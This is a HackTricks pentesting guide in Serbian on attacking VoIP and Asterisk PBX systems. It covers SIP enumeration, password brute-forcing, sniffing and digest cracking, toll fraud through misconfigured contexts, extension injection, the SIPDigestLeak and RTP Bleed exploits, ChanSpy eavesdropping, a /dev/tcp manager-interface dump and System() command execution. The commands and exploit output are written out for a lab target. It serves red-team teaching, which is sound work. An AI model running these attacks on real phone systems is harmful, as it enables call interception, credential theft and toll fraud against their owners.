# Pentestiranje VoIP-a

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije o VoIP-u

Da biste poÄeli da uÄite o tome kako VoIP funkcioniÅ¡e, proverite:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Enumeracija VoIP-a

### Telefonski brojevi

Jedan od prvih koraka koje Red Team moÅ¾e da preduzme je da pretraÅ¾i dostupne telefonske brojeve za kontaktiranje kompanije koristeÄ‡i OSINT alate, Google pretrage ili skeniranje web stranica.

Kada imate telefonske brojeve, moÅ¾ete koristiti online usluge za identifikaciju operatera:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ZnajuÄ‡i da li operater pruÅ¾a VoIP usluge, moÅ¾ete identifikovati da li kompanija koristi VoIP... Osim toga, moguÄ‡e je da kompanija nije angaÅ¾ovala VoIP usluge, veÄ‡ koristi PSTN kartice za povezivanje sopstvene VoIP PBX sa tradicionalnom telefonskom mreÅ¾om.

Stvari poput automatskih odgovora ili muzike obiÄno ukazuju na to da se koristi VoIP.
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT informacije

Sve druge OSINT metode koje pomaÅ¾u u identifikaciji koriÅ¡Ä‡enog VoIP softvera Ä‡e biti od pomoÄ‡i za Crveni Tim.

### Enumeracija mreÅ¾e

* **`nmap`** je sposoban za skeniranje UDP servisa, ali zbog velikog broja skeniranih UDP servisa, veoma je spor i moÅ¾da nije vrlo precizan sa ovakvim vrstama servisa.
* **`svmap`** iz SIPVicious (`sudo apt install sipvicious`): LociraÄ‡e SIP servise u navedenoj mreÅ¾i.
* `svmap` je **lako blokirati** jer koristi User-Agent `friendly-scanner`, ali moÅ¾ete izmeniti kod iz `/usr/share/sipvicious/sipvicious` i promeniti ga.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan je veoma brzi skener za SIP usluge preko UDP, TCP ili TLS protokola. Koristi viÅ¡enitnost i moÅ¾e skenirati velike opsege mreÅ¾a. OmoguÄ‡ava lako navoÄ‘enje opsega porta, skeniranje i TCP i UDP protokola, koriÅ¡Ä‡enje drugih metoda (po defaultu Ä‡e koristiti OPTIONS) i navoÄ‘enje drugaÄijeg User-Agent-a (i joÅ¡ mnogo toga).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit je moÄ‡an alat za testiranje penetracije koji se Äesto koristi u svetu hakovanja. Ovaj alat omoguÄ‡ava hakere da identifikuju ranjivosti u sistemima i izvrÅ¡e napade na njih. Metasploit pruÅ¾a Å¡irok spektar modula i eksploita koji se mogu koristiti za iskoriÅ¡Ä‡avanje ranjivosti u razliÄitim mreÅ¾nim servisima. Ovaj alat je veoma popularan meÄ‘u hakere zbog svoje fleksibilnosti i efikasnosti. Metasploit takoÄ‘e pruÅ¾a moguÄ‡nost automatizacije napada, Å¡to olakÅ¡ava hakere u izvrÅ¡avanju napada na ciljane sisteme.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatno prebrojavanje mreÅ¾e

PBX takoÄ‘e moÅ¾e otkrivati druge mreÅ¾ne usluge kao Å¡to su:

* **69/UDP (TFTP)**: AÅ¾uriranje firmware-a
* **80 (HTTP) / 443 (HTTPS)**: Upravljanje ureÄ‘ajem putem weba
* **389 (LDAP)**: Alternativa za skladiÅ¡tenje informacija o korisnicima
* **3306 (MySQL)**: MySQL baza podataka
* **5038 (Manager)**: OmoguÄ‡ava koriÅ¡Ä‡enje Asteriska sa drugih platformi
* **5222 (XMPP)**: Poruke putem Jabbera
* **5432 (PostgreSQL)**: PostgreSQL baza podataka
* I druge...

### Prebrojavanje metoda

MoguÄ‡e je pronaÄ‡i **koje su metode dostupne** za upotrebu u PBX-u koristeÄ‡i `sipenumerate.py` iz [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Enumeracija proÅ¡irenja

ProÅ¡irenja u PBX (Private Branch Exchange) sistemu se odnose na **jedinstvene interne identifikatore dodijeljene pojedinaÄnim** telefonskim linijama, ureÄ‘ajima ili korisnicima unutar organizacije ili preduzeÄ‡a. ProÅ¡irenja omoguÄ‡avaju **efikasno usmjeravanje poziva unutar organizacije**, bez potrebe za pojedinaÄnim vanjskim telefonskim brojevima za svakog korisnika ili ureÄ‘aj.

* **`svwar`** iz SIPVicious (`sudo apt install sipvicious`): `svwar` je besplatni skener linija proÅ¡irenja SIP PBX-a. Konceptualno radi sliÄno tradicionalnim wardialerima tako Å¡to **pogaÄ‘a raspon proÅ¡irenja ili datu listu proÅ¡irenja**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identifikuje ekstenzije na SIP serveru. Sipexten moÅ¾e proveriti velike mreÅ¾e i opsege portova.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: TakoÄ‘e moÅ¾ete nabrojati ekstenzije/korisniÄka imena pomoÄ‡u metasploita:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** je alat za **bruteforce pretragu korisniÄkih imena** za Inter Asterisk Exchange (IAX) protokol. enumIAX moÅ¾e raditi u dva razliÄita moda; Sekvencijalno nagaÄ‘anje korisniÄkih imena ili Napad rjeÄnikom.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Napadi na VoIP

### Brute-Force napad na lozinke

Nakon Å¡to je otkriven **PBX** i neki **ekstenzije/korisniÄka imena**, Crveni tim moÅ¾e pokuÅ¡ati **autentifikaciju putem metode `REGISTER`** na ekstenziju koristeÄ‡i reÄnik uobiÄajenih lozinki za brute-force napad.

{% hint style="danger" %}
Imajte na umu da **korisniÄko ime** moÅ¾e biti isto kao i ekstenzija, ali ova praksa moÅ¾e varirati u zavisnosti od PBX sistema, njegove konfiguracije i preferencija organizacije...

Ako korisniÄko ime nije isto kao i ekstenzija, moraÄ‡ete **odrediti korisniÄko ime kako biste ga napali brute-force metodom**.
{% endhint %}

* **`svcrack`** iz SIPVicious (`sudo apt install sipvicious`): SVCrack vam omoguÄ‡ava da napadnete lozinku za odreÄ‘eno korisniÄko ime/ekstenziju na PBX-u.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack je alat za probijanje autentifikacije digesta unutar SIP protokola.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Snifovanje VoIP-a

Ako pronaÄ‘ete VoIP opremu unutar **otvorenog WiFi mreÅ¾e**, moÅ¾ete **snifovati sve informacije**. Osim toga, ako se nalazite unutar zatvorenije mreÅ¾e (povezani preko Ethernet-a ili zaÅ¡tiÄ‡enog WiFi-ja), moÅ¾ete izvesti **MitM napade kao Å¡to je** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) izmeÄ‘u **PBX-a i gateway-a** kako biste snifovali informacije.

MeÄ‘u informacijama o mreÅ¾i, moÅ¾ete pronaÄ‡i **web pristupne podatke** za upravljanje opremom, korisniÄke **ekstenzije**, **korisniÄka imena**, **IP** adrese, Äak i **hashirane lozinke** i **RTP pakete** koje moÅ¾ete reprodukovati kako biste **Äuli razgovor**, i joÅ¡ mnogo toga.

Da biste dobili ove informacije, moÅ¾ete koristiti alate poput Wireshark-a, tcpdump-a... ali **posebno kreiran alat za snifovanje VoIP razgovora je** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Imajte na umu da ako se **TLS koristi u SIP komunikaciji**, neÄ‡ete moÄ‡i videti SIP komunikaciju u Äistom obliku.\
Isto Ä‡e se dogoditi ako se koristi **SRTP** i **ZRTP**, **RTP paketi neÄ‡e biti u Äitljivom tekstu**.
{% endhint %}

#### SIP pristupni podaci

[Pogledajte ovaj primer da biste bolje razumeli **SIP REGISTER komunikaciju**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) kako biste saznali kako se **pristupni podaci Å¡alju**.

* **`sipdump`** & **`sipcrack`,** deo **sipcrack** (`apt-get install sipcrack`): Ovi alati mogu **izvuÄ‡i** iz **pcap** datoteke **digest autentifikacije** unutar SIP protokola i **bruteforce** ih.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** sa [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** izvlaÄi podatke protokola SIP iz PCAP datoteke.
* **SipDump** izvlaÄi SIP Digest autentifikacije iz PCAP datoteke.
* **SIP Digest Crack** je alat za pucanje Digest autentifikacija unutar SIP protokola.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMF kodovi

**Ne samo SIP akreditacije** mogu se pronaÄ‡i u mreÅ¾nom saobraÄ‡aju, veÄ‡ je takoÄ‘e moguÄ‡e pronaÄ‡i DTMF kodove koji se koriste, na primer, za pristup **glasovnoj poÅ¡ti**.\
MoguÄ‡e je poslati ove kodove u **INFO SIP porukama**, u **audio** formatu ili unutar **RTP paketa**. Ako su kodovi unutar RTP paketa, moÅ¾ete iseÄ‡i taj deo razgovora i koristiti alatku multimo za njihovo izdvajanje:
```bash
multimon -a DTMF -t wac pin.wav
```
### Besplatni pozivi / Nesigurna konfiguracija veza Asterisk-a

U Asterisk-u je moguÄ‡e dozvoliti vezu **sa odreÄ‘ene IP adrese** ili sa **bilo koje IP adrese**:
```
host=10.10.10.10
host=dynamic
```
Ako je navedena IP adresa, host **neÄ‡e morati slati REGISTER** zahtjeve svakih nekoliko minuta (u REGISTER paketu se Å¡alje vreme Å¾ivota, obiÄno 30 minuta, Å¡to znaÄi da bi u drugom scenariju telefon morao da se registruje svakih 30 minuta). MeÄ‘utim, moraÄ‡e imati otvorene portove koji omoguÄ‡avaju konekcije sa VoIP serverom za primanje poziva.

Da bismo definisali korisnike, mogu se definisati na sledeÄ‡i naÄin:

* **`type=user`**: Korisnik moÅ¾e samo primati pozive kao korisnik.
* **`type=friend`**: MoguÄ‡e je obavljati pozive kao peer i primati ih kao korisnik (koristi se sa ekstenzijama)
* **`type=peer`**: MoguÄ‡e je slati i primati pozive kao peer (SIP-trunkovi)

TakoÄ‘e je moguÄ‡e uspostaviti poverenje sa nesigurnom promenljivom:

* **`insecure=port`**: OmoguÄ‡ava peer konekcije koje su validirane preko IP adrese.
* **`insecure=invite`**: Ne zahteva autentifikaciju za INVITE poruke.
* **`insecure=port,invite`**: Oboje

{% hint style="warning" %}
Kada se koristi **`type=friend`**, **vrednost** promenljive **host** **neÄ‡e biti koriÅ¡Ä‡ena**, pa ako administrator **pogreÅ¡no konfiguriÅ¡e SIP-trunk** koristeÄ‡i tu vrednost, **svako Ä‡e moÄ‡i da se poveÅ¾e sa njim**.

Na primer, ova konfiguracija bi bila ranjiva:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Besplatni pozivi / Nesigurna konfiguracija konteksta u Asterisku

U Asterisku, **kontekst** je nazvani kontejner ili sekcija u planu biranja koji **grupiÅ¡e povezane ekstenzije, akcije i pravila**. Plan biranja je osnovna komponenta sistema Asterisk, jer definiÅ¡e **kako se obraÄ‘uju i rutiraju dolazni i odlazni pozivi**. Konteksti se koriste za organizovanje plana biranja, upravljanje kontrolom pristupa i pruÅ¾anje razdvajanja izmeÄ‘u razliÄitih delova sistema.

Svaki kontekst je definisan u konfiguracionom fajlu, obiÄno u fajlu **`extensions.conf`**. Konteksti se oznaÄavaju uglastim zagradama, sa imenom konteksta unutar njih. Na primer:
```bash
csharpCopy code[my_context]
```
Unutar konteksta, definiÅ¡ete ekstenzije (obrasce biranih brojeva) i povezujete ih sa nizom akcija ili aplikacija. Ove akcije odreÄ‘uju kako Ä‡e poziv biti obraÄ‘en. Na primer:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ovaj primer prikazuje jednostavan kontekst nazvan "my\_context" sa ekstenzijom "100". Kada neko birne 100, poziv Ä‡e biti prihvaÄ‡en, reprodukovaÄ‡e se poruka dobrodoÅ¡lice, a zatim Ä‡e poziv biti prekinut.

Ovo je **joÅ¡ jedan kontekst** koji omoguÄ‡ava **pozivanje bilo kog drugog broja**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Ako administrator definiÅ¡e **podrazumevani kontekst** kao:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Bilo ko Ä‡e moÄ‡i da koristi **server da pozove bilo koji drugi broj** (a administrator servera Ä‡e platiti poziv).
{% endhint %}

{% hint style="danger" %}
Osim toga, podrazumevano **`sip.conf`** datoteka sadrÅ¾i **`allowguest=true`**, Å¡to znaÄi da Ä‡e **svaki** napadaÄ bez autentifikacije moÄ‡i da pozove bilo koji drugi broj.
{% endhint %}

*   **`sipinvite.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite proverava da li nam **PBX server omoguÄ‡ava da vrÅ¡imo pozive bez autentifikacije**. Ako SIP server ima neispravnu konfiguraciju, dozvoliÄ‡e nam da vrÅ¡imo pozive ka spoljnim brojevima. TakoÄ‘e nam moÅ¾e omoguÄ‡iti da preusmerimo poziv na drugi spoljni broj.

Na primer, ako vaÅ¡ Asterisk server ima loÅ¡u konfiguraciju konteksta, moÅ¾ete prihvatiti INVITE zahtev bez autorizacije. U tom sluÄaju, napadaÄ moÅ¾e vrÅ¡iti pozive ne znajuÄ‡i korisniÄko ime/lozinku.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Besplatni pozivi / Nesigurna konfiguracija IVRS-a

IVRS oznaÄava **Interaktivni sistem za odgovaranje glasom**, telefonsku tehnologiju koja omoguÄ‡ava korisnicima da komuniciraju sa raÄunarskim sistemom putem glasa ili tona pritiskom na tastere. IVRS se koristi za izgradnju **automatizovanih sistema za upravljanje pozivima** koji pruÅ¾aju razliÄite funkcionalnosti, kao Å¡to su pruÅ¾anje informacija, usmeravanje poziva i prikupljanje korisniÄkih unosa.

IVRS u VoIP sistemima obiÄno se sastoji od:

1. **Glasovnih poruka**: Prethodno snimljenih audio poruka koje vode korisnike kroz opcije i uputstva IVR menija.
2. **DTMF** (Dual-Tone Multi-Frequency) signalizacija: Unosi tona pritiskom na tastere na telefonu, koja se koriste za navigaciju kroz IVR menije i pruÅ¾anje unosa.
3. **Usmeravanje poziva**: Usmeravanje poziva ka odgovarajuÄ‡oj destinaciji, kao Å¡to su odreÄ‘eni departmani, agenti ili ekstenzije na osnovu korisniÄkog unosa.
4. **Prikupljanje korisniÄkih unosa**: Prikupljanje informacija od pozivaoca, kao Å¡to su brojevi raÄuna, identifikatori sluÄaja ili bilo koji drugi relevantni podaci.
5. **Integracija sa spoljnim sistemima**: Povezivanje IVR sistema sa bazama podataka ili drugim softverskim sistemima radi pristupa ili aÅ¾uriranja informacija, izvrÅ¡avanja radnji ili pokretanja dogaÄ‘aja.

U Asterisk VoIP sistemu moÅ¾ete kreirati IVR koristeÄ‡i plan biranja (**`extensions.conf`** fajl) i razliÄite aplikacije kao Å¡to su `Background()`, `Playback()`, `Read()` i druge. Ove aplikacije vam pomaÅ¾u da reprodukujete glasovne poruke, prikupljate korisniÄke unose i kontroliÅ¡ete tok poziva.

#### Primer nesigurne konfiguracije
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Prethodni primer pokazuje situaciju gde se korisniku traÅ¾i da **pritisne 1 za poziv** na odreÄ‘eno odeljenje, **2 za poziv** na drugo odeljenje, ili **unese potpuni broj ekstenzije** ako ga zna.\
Ranjivost je u tome Å¡to se **duÅ¾ina unete ekstenzije ne proverava**, tako da korisnik moÅ¾e uneti potpuni broj i poziv Ä‡e biti uspostavljen.

### Ubacivanje ekstenzije

KoriÅ¡Ä‡enje ekstenzije kao Å¡to je:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gde se **`${EXTEN}`** nalazi **ekstenzija** koja Ä‡e biti pozvana, kada se unese **ext 101**, ovo bi se desilo:
```scss
exten => 101,1,Dial(SIP/101)
```
MeÄ‘utim, ako **`${EXTEN}`** dozvoljava unoÅ¡enje **viÅ¡e od brojeva** (kao u starijim verzijama Asteriska), napadaÄ bi mogao uneti **`101&SIP123123123`** kako bi pozvao broj telefona 123123123. I ovo bi bio rezultat:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Stoga, poziv na ekstenziju **`101`** i **`123123123`** Ä‡e biti poslat i samo prvi koji dobije poziv Ä‡e biti uspostavljen... ali ako napadaÄ koristi **ekstenziju koja zaobilazi svako podudaranje** koje se vrÅ¡i, ali ne postoji, on moÅ¾e **ubaciti poziv samo na Å¾eljeni broj**.

## SIPDigestLeak

SIP Digest Leak je ranjivost koja utiÄe na veliki broj SIP telefona, ukljuÄujuÄ‡i i hardverske i softverske IP telefone, kao i adaptere za telefone (VoIP na analogni). Ranjivost omoguÄ‡ava **procurivanje odgovora za Digest autentifikaciju**, koji se izraÄunava na osnovu lozinke. Tada je moguÄ‡ **napad na lozinku izvan mreÅ¾e** i moguÄ‡e je povratiti veÄ‡inu lozinki na osnovu odgovora na izazov.

**[Scenario ranjivosti odavde**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP telefon (Å¾rtva) sluÅ¡a na portu 5060 i prihvata telefonske pozive
2. NapadaÄ Å¡alje INVITE IP telefonu
3. Telefon Å¾rtve poÄinje zvoniti i neko se javlja i spuÅ¡ta sluÅ¡alicu (jer niko ne odgovara na drugom kraju telefona)
4. Kada se telefon spusti, **telefon Å¾rtve Å¡alje BYE napadaÄu**
5. NapadaÄ izdaje odgovor 407 koji **traÅ¾i autentifikaciju** i izdaje izazov za autentifikaciju
6. **Telefon Å¾rtve pruÅ¾a odgovor na izazov autentifikacije** u drugom BYE-u
7. **NapadaÄ tada moÅ¾e izvrÅ¡iti napad iscrpljivanjem resursa** na odgovor izazova na svojoj lokalnoj maÅ¡ini (ili distribuiranoj mreÅ¾i itd.) i pogoditi lozinku

* **sipdigestleak.py** iz [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak iskoriÅ¡Ä‡ava ovu ranjivost.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call omoguÄ‡ava **korisniku veba** (koji na primer moÅ¾e biti zainteresovan za proizvod) da **unese** svoj **broj telefona** kako bi bio pozvan. Zatim Ä‡e biti pozvan komercijalni broj, i kada **korisnik podigne sluÅ¡alicu**, biÄ‡e **pozvan i povezan sa agentom**.

UobiÄajeni Asterisk profil za ovo je:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Prethodni profil omoguÄ‡ava **BILO KOJOJ IP adresi da se poveÅ¾e** (ako je poznata lozinka).
* Da biste **organizovali poziv**, kao Å¡to je prethodno navedeno, **nije potrebna dozvola za Äitanje** i potrebno je samo **originate** u **write**.

Sa ovim dozvolama, bilo koja IP adresa koja zna lozinku moÅ¾e se povezati i izvuÄ‡i previÅ¡e informacija, kao Å¡to su:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**ViÅ¡e informacija ili radnji moÅ¾e biti zatraÅ¾eno.**

### **PrisluÅ¡kivanje**

U Asterisku je moguÄ‡e koristiti komandu **`ChanSpy`** koja oznaÄava **ekstenziju(e) za praÄ‡enje** (ili sve njih) kako bi se Äule razgovori koji se odvijaju. Ova komanda mora biti dodeljena jednoj ekstenziji.

Na primer, **`exten => 333,1,ChanSpy('all',qb)`** oznaÄava da ako **pozovete** **ekstenziju 333**, ona Ä‡e **pratiti** **`sve`** ekstenzije, **poÄeti da sluÅ¡a** svaki put kada zapoÄne novi razgovor (**`b`**) u tihom reÅ¾imu (**`q`**) jer ne Å¾elimo da se meÅ¡amo u njega. MoÅ¾ete preÄ‡i sa jednog razgovora na drugi pritiskom na **`*`**, ili oznaÄavanjem broja ekstenzije.

TakoÄ‘e je moguÄ‡e koristiti **`ExtenSpy`** za praÄ‡enje samo jedne ekstenzije.

Umesto sluÅ¡anja razgovora, moguÄ‡e je **snimati ih u fajlove** koristeÄ‡i ekstenziju kao Å¡to je:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Pozivi Ä‡e biti saÄuvani u **`/tmp`**.

TakoÄ‘e, moÅ¾ete Äak i da naterate Asterisk da **izvrÅ¡i skriptu koja Ä‡e otkriti poziv** kada se zatvori.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** je veliki sigurnosni problem koji utiÄe na Asterisk bazirane VoIP servere (objavljen 2017. godine). Ova ranjivost omoguÄ‡ava da se **RTP (Real Time Protocol) saobraÄ‡aj**, koji prenosi VoIP razgovore, **interceptira i preusmeri od strane bilo koga na internetu**. Ovo se deÅ¡ava zato Å¡to RTP saobraÄ‡aj zaobilazi autentifikaciju prilikom prolaska kroz NAT (Network Address Translation) firewall-e.

RTP proxy-ji pokuÅ¡avaju da reÅ¡e **NAT ograniÄenja** koja utiÄu na RTC sisteme tako Å¡to posreduju RTP tokove izmeÄ‘u dve ili viÅ¡e strana. Kada je NAT prisutan, softver RTP proxy-ja Äesto ne moÅ¾e da se osloni na RTP IP i port informacije dobijene putem signalizacije (npr. SIP). Zbog toga, nekoliko RTP proxy-ja je implementiralo mehanizam gde se takav **IP i port par automatski uÄi**. Ovo se Äesto radi inspekcijom dolaznog RTP saobraÄ‡aja i oznaÄavanjem izvornog IP i porta za bilo koji dolazni RTP saobraÄ‡aj kao onog na koji treba odgovoriti. Ovaj mehanizam, koji se moÅ¾e nazvati "reÅ¾im uÄenja", **ne koristi nikakvu vrstu autentifikacije**. Stoga **napadaÄi** mogu **slati RTP saobraÄ‡aj RTP proxy-ju** i primati prosleÄ‘eni RTP saobraÄ‡aj namenjen pozivaocu ili primaocu postojeÄ‡eg RTP toka. Ovu ranjivost nazivamo RTP Bleed jer omoguÄ‡ava napadaÄima da primaju RTP medijske tokove namenjene legitimnim korisnicima.

JoÅ¡ jedno interesantno ponaÅ¡anje RTP proxy-ja i RTP stack-ova je da ponekad, **Äak i ako nisu ranjivi na RTP Bleed**, oni Ä‡e **prihvatiti, proslediti i/ili obraditi RTP pakete sa bilo kog izvora**. Stoga napadaÄi mogu slati RTP pakete koji im omoguÄ‡avaju da ubace svoje medije umesto legitimnih. Ovaj napad nazivamo RTP injection jer omoguÄ‡ava ubacivanje nelegitimnih RTP paketa u postojeÄ‡e RTP tokove. Ova ranjivost moÅ¾e se naÄ‡i i kod RTP proxy-ja i kod krajnjih taÄaka.

Asterisk i FreePBX tradicionalno koriste **`NAT=yes` podeÅ¡avanje**, koje omoguÄ‡ava da RTP saobraÄ‡aj zaobiÄ‘e autentifikaciju, Å¡to moÅ¾e dovesti do nedostatka zvuka ili jednosmernog zvuka tokom poziva.

Za viÅ¡e informacija posetite [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Detektuje ranjivost RTP Bleed slanjem RTP tokova.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Otkriva ranjivost RTP Bleed slanjem RTP tokova.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Iskoristite ranjivost RTP Bleed slanjem RTP tokova
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** Iskoristite ranjivost RTP Bleed slanjem RTP tokova (iz audio fajla)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

U Asterisku nekako uspevate da **dodate pravila proÅ¡irenja i ponovo ih uÄitate** (na primer, kompromitovanjem ranjivog web menadÅ¾erskog servera), moguÄ‡e je dobiti RCE koriÅ¡Ä‡enjem **`System`** komande.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Postoji komanda nazvana **`Shell`** koja se moÅ¾e koristiti umesto `System` za izvrÅ¡avanje sistemskih komandi ako je potrebno.

{% hint style="warning" %}
